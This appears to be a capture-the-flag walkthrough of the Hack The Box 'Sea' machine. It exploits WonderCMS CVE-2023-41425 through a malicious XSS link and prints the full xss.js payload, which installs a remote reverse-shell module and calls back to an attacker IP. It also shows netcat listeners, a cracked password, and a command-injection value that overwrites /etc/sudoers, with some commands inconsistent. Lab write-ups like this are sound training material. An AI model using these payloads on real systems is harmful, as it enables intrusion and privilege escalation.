```

From here we see that ports `22 and 80` are open.

I looked up a vulnerability for `Apache httpd 2.4.41` and found the following:

![](../../../assets/783ec0db47a3667d68e1d179cad5927c.png)

Might come in handy

### 80/TCP - HTTP

We head to the site and here we find nothing of great interest except for a contact page.

![](../../../assets/d2f7ff99a0402a7110ef0a041b14ecbc.png)

We notice that there's a `contact.php` page:

![](../../../assets/42c7bb9a72b17e3bf1e0309476c7cf5b.png)

#### BurpSuite
My instinct was to instantly go into `Burp` to analyse the `POST` request this form was making.

![](../../../assets/4c2cfbcd9163b6ce73f0a1525aa8b341.png)

Here I tried:
- `SQL injection methods` which had no effect.
- `XSS attacks` by inputting different scripts in the `params` which also did not work.

At the same time I launched `Hydra` in order to `brute force SSH`:

![](../../../assets/f51a84b577609dd85565933540237998.png)

That was gonna last a while so I tried other methods at the same time.

==Directory enumeration==
I tried `Gobuster` and found some interesting directories, but when I headed to them I kept getting all the same messages:

![](../../../assets/498726f69c912175602d2070ce1248ce.png)

So I decided to try `dirsearch`:

```bash

When I saw the `/themes` endpoint I tried to head to it but that too was `forbidden`. Yet I viewed the `source page` and found the following stylesheet:

![](../../../assets/ff1bf96ec383d56c9fc705d3998c9abc.png)

So I tried a `dirsearch` again but more focussed now on subdirectories:

Task Completed
```

As you can see we finally struck gold. We found a `README.md` file in one of the subdirectories and it's showing up as `status 200`, let's check it out.

![](../../../assets/0233b10ddbe603872d993ec4b4273e90.png)

It mentions `WonderCMS`, a Content Management System, interesting. Let's now check out the `/version` endpoint.

![](../../../assets/27e2e464d4a4b8d4ea60ddc73b8ab9db.png)

## Exploit
Aha! Now we know that this site is using `WonderCMS 3.2.0`. I looked up whether there's any available exploits and landed on this [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425?tab=readme-ov-file):

![](../../../assets/d418800d56a3c94e2b49216f86b7a771.png)

It's a script which utilizes `Cross Site Scripting` and uploads a `Remote Code Execution shell`.

Let's download it and try it out.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py                                                   
usage: python3 exploit.py loginURL IP_Address Port
example: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252
```

We can now set it up for ourselves, we basically need to use this exploit on the `/contact.php` page (since that is the only page where we can submit stuff). Inside the `exploit.py` script we find a line that sticks out to us:

```python
xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
```

We save this thought for later as it will come in handy. Now we can go ahead and set up the exploit as follows:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py "http://sea.htb/index.php?page=loginURL" 10.10.14.24 6262 
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 6262
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=index.php?page=loginURL?"></form><script+src="http://10.10.14.24:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
nc -lvnp 6262
```

Now I entered the following line in the form and waited if it went through:

```bash
http://sea.htb/index.php?page=index.php?page=loginURL?"></form><script+src="http://10.10.14.24:8000/xss.js"></script><form+action="
```

![](../../../assets/2595e71600cad0236b58ed82a2b4311d.png)

Indeed it did, afterwards I checked out the `xss.js` file that was created and uploaded:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat xss.js  

var url = "http://sea.htb/index.php?page=loginURL";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "10.10.14.24";
       var port = "6262";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};

```

All appears correct, now we just need to navigate to the previously mentioned `URL` on the website:

```bash
http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.24&lport=6262
```


For some reason it just did not end up working even though I reset the machine multiple times it did not work.

![](../../../assets/d13393b737d8fc6f3c4128ed1d77a842.png)


## VPN Change

After many false attempts I ended up changing my `HTB VPN connection` and tried it again but more simplified and this time it finally worked:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 exploit.py http://sea.htb/themes 10.10.14.24 4444
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.4&lport=4444' 
```

![](../../../assets/dbdf545fcb9f04c2d11b3a97154fe1a5.png)

Now that we FINALLY have a reverse shell we can get to exploiting the machine further.

First of all I have stabilised the shell like so:

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/$ 
```

We are not allowed to run `sudo -l` nor are we allowed to `cat` the `user.txt` flag. Thus it is time for `Privilege Escalation`.

## Privilege Escalation

I started off with `OS Info` and went with the first script:

```bash
(cat /proc/version || uname -a ) 2>/dev/null
```

This gave me the following output:

```bash
(cat /proc/version || uname -a ) 2>/dev/null
Linux version 5.4.0-190-generic (buildd@lcy02-amd64-039) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024
```

We can search this version of Linux up on `Searchsploit to see whether it has any vulnerabilities`. 

![](../../../assets/e2c09cbd5fffc8e57ecfe7fc6ca4b731.png)

Unfortunate for us it only mentions a `Bluetooth` vulnerability which means we'll have to dig deeper. 

We find nothing that can really help us so I went ahead and started checking the directories. I remembered that `Dirsearch` showed me an endpoint of `/data` which I thought sounded interesting so I looked into it and I found something:

![](../../../assets/06908034c927b9342354ec731b515a49.png)

Well look at that, a whole `database` file. I used `cat` on this file and viewed it's contents:

![](../../../assets/f5f941c2170980f512d1d54c600b10a9.png)

We got a password hash! It appears to be a `bcrypt` hash which we need to reformat by removing the 2 `\` and then we can use `John` against it:

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

Now let's run it:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Great we cracked the password, let's find out what the user for it is. We have 2 users in the `/home` directory:

```bash
www-data@sea:/home$ ls -l
ls -l
total 8
drwxr-xr-x 6 amay amay 4096 Aug 14 07:50 amay
drwxr-x--- 4 geo  geo  4096 Aug  1 12:13 geo
```

Let's start with `amay`

### 22/TCP - SSH

We try to login using the credentials we have found:

```
amay
mychemicalromance
```

![](../../../assets/2f6647c57fcfe0512a18f9e2245c4aa5.png)

And we are in. Let's check `sudo privileges` and get some flags.

```bash
amay@sea:~$ sudo -l
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea.
```

This means we'll have to find out different methods.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](../../../assets/0ce3f9e82c520713a6429c2bddf1d019.png)

This shows us a list of files with `SUID/GUID privileges`, nothing notable for us. I still had a go with some of the binaries but none of them worked so I instead opted for another option.

## Port Forwarding
To forward our port we run the following in a new terminal (not inside the `SSH shell`): 

```bash
ssh -L 8080:localhost:8080 amay@sea.htb
```

>If it is not possible to forward the port it could mean that port 8080 is busy, check this using the following command: `sudo lsof -i :8080`. If the port is indeed busy, kill it and try the command again.

When done it should look like this:

![](../../../assets/e2de046ed1d64d047136c851c216b797.png)

Afterwards we can go to `localhost:8080` which is forwarding this exact port to see what is running on there. The site will ask you to sign in, simply use `amay's creds`.

![](../../../assets/dfadc172e0a397196935d1d5265ca1d5.png)

Let's check the `Analyze Log File` page and while doing we'll run `Burpsuite` to analyse the requests.

For more about `Port Forwarding` check out [this heading](Linux%20Privilege%20Escalation.md#Network#Port%20Forwarding).

### Burpsuite

Since we have a forward port running on `8080` we'll have to change the `Burpsuite proxy settings`:

![](../../../assets/9c0b4490b5f5ff512465acbfec27fa04.png)

![](../../../assets/1b6ecee496eb4ca40d8ccb41e71f8996.png)

Now that the `Burpsuite` proxy is configure to `8070` we can get to work. If all is correct we should get the following screen when we click on `Analyse`:

![](../../../assets/9dbca0984c1a3396a513030d50732ff3.png)

We can try and manipulate this request:

![](../../../assets/81cd881145602a6918784c3163775789.png)

In `line 3788` it now tells us that `suspicious traffic patterns were detected`. This is actually a good thing for us because that tells us that `Command Injection` is possible!

We then scribble up a command using `ChatGPT` which will copy over the `root` flag and output it's contents for us. This exposure happened due to some side effects of the command and execution:

```
log_file=/root/root.txt;cp /dev/shm/sudoers > /etc/sudoers&analyze_log=
